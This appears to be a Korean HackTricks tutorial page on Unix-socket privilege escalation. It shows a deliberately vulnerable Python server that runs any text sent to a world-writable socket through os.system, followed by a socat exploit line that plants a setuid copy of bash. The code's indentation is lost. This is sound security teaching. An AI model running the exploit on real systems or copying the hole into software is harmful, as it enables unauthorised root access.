{{#include ../../banners/hacktricks-training.md}}

## Python을 이용한 소켓 바인딩 예제

다음 예제에서는 **유닉스 소켓이 생성됩니다** (`/tmp/socket_test.s`) 그리고 **수신된 모든 것**은 `os.system`에 의해 **실행됩니다**. 이 예제가 실제 환경에서 발견되지 않을 것이라는 것을 알고 있지만, 이 예제의 목표는 유닉스 소켓을 사용하는 코드가 어떻게 생겼는지, 그리고 최악의 경우 입력을 어떻게 관리하는지를 보는 것입니다.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**코드를 실행**하려면 python을 사용하세요: `python s.py` 그리고 **소켓이 어떻게 수신 대기하는지 확인하세요**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**익스플로잇**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
